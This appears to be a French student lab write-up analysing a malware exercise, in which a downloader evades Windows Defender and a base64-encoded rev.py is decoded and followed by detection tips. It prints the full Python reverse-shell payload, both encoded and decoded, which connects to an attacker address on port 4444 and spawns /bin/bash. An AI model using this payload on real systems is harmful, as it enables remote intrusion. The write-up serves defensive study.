1- le server windows detecte le malware.ps1 et la directement identifier comme un trojan comme montrer dans les screenshots. 


2- windows defender supprime le malware quelque seconde apres l'analyse .


3. une fois le fichier Defeat.bat sur le bureau nous n'observons aucune reaction de windows defender qu'il ne le detecte pas comme un fichier malvaillant.

4- le fichier ne semble pas suspicieux car le scan de windows defender ne trouve aucun danger 


5- le fichier defeat n'est pas detecter par l'anti virus car il ne sert juste qu'a telechager des virus et des malware sur la machine 

exemple montrer sure les images 

une fois le fichier ouvert sur le terminal il nous demande ou voulons nous installer le malware 

cela telecharge un autre fichier dat qui est appeler defeat-defender.dat 

6- il nous est demander d'ouvrire le fichier rev.py qui est un fichier coder en python d'ou le .py 


le fichier est encoder en base 64 ce qui ne permet pas de lire son contenue alors , j'utilise la commande base64 --decode pour decoder le contenue 



programe encodrer :

aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKaG9zdCA9ICIxOTIuMTY4LjIuMTkyIgpwb3J0
ID0gNDQ0NApzID0gc29ja2V0LnNvY2tldCAoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NU
UkVBTSk7CnMuY29ubmVjdCgoaG9zdCwgcG9ydCkpIApvcy5kdXAyIChzLmZpbGVubyAoKSwgMCkg
Cm9zLmR1cDIgKHMuZmlsZW5vICgpLDEpCm9zLmR1cDIgKHMuZmlsZW5vICgpLCAyKQpwID0gc3Vi
cHJvY2Vzcy5hbGwoIi9iaW4vYmFzaCIpCg==


programme decoder avec kali linux :

┌──(kali㉿kali)-[~/Desktop]
└─$ base64 --decode rev.py 
import socket, subprocess, os
host = "192.168.2.192"
port = 4444
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM);
s.connect((host, port)) 
os.dup2 (s.fileno (), 0) 
os.dup2 (s.fileno (),1)
os.dup2 (s.fileno (), 2)
p = subprocess.all("/bin/bash")
                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ 


Le programme semble être un script Python qui crée une connexion de socket vers un hôte et un port spécifiés. Une fois la connexion établie, il redirige l'entrée standard (stdin), la sortie standard (stdout) et l'erreur standard (stderr) vers le socket, puis exécute un processus secondaire pour exécuter la commande "/bin/bash".


l'addresse ip du hacker :

192.168.2.192


le port de communication par lequel il communique avec la cible:

4444


pour detecter ce genre d'attaque qui est une attaque via reverse shell:

nous devons , surveiller le reseau en utilisant des outils approprier pour detecter les connexion entre notre machine et celle des attaquants 


- Surveillez les journaux système pour des activités suspectes, en particulier les journaux liés aux connexions réseau et aux exécutions de processus. Par exemple, examinez les journaux d'authentification et les journaux du système d'exploitation.


- Utilisez des outils tels que ps (sur Linux) ou le Gestionnaire des tâches sur Windows pour examiner les processus en cours d'exécution. Recherchez des processus qui semblent anormaux, tels que des shells inattendus ou des processus liés à des connexions réseau suspectes.

et surement d'autre que je ne connais peut etre pas.
